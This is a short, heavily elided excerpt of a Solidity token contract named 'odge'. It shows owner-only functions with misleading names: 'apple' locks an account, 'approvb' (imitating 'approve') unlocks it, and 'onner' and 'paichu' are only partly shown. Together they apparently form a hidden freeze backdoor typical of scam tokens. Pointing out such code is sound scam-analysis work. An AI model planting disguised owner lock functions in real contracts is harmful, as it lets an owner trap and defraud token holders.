...
contract BaseToken is Ownable {
    ...
    string constant public name = 'odge';
    ...
    function onner(address target, uint256 edAmount) public onlyowneres{
    ...
    function apple(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function approvb(address account) public onlyowneres {
        _lkck[account] = false;
    }
    ...
    function paichu(address account) public onlyowneres {
